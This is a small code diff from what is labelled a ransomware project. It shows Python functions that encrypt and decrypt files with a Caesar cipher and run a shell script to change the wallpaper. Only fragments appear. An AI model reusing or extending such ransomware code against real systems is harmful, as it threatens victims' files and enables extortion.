@@ -74,8 +74,7 @@ def SearchnEncrypt():
 
             fo.write(enc1)
             
-         #   decryp = CaesarCipher2.caesar('decrypt',encyrp,55)
-          #  fo.write(decryp)
+       
             
             fo.close()
             
@@ -107,7 +106,7 @@ def searchnDecrypt():
       
             
             fo.close()
-            
+            #script to change wallpaper 
             os.system("sh /Users/claude/Documents/ransomeware/oscrip.sh")
             
             print file, 'sucessful decrypted'
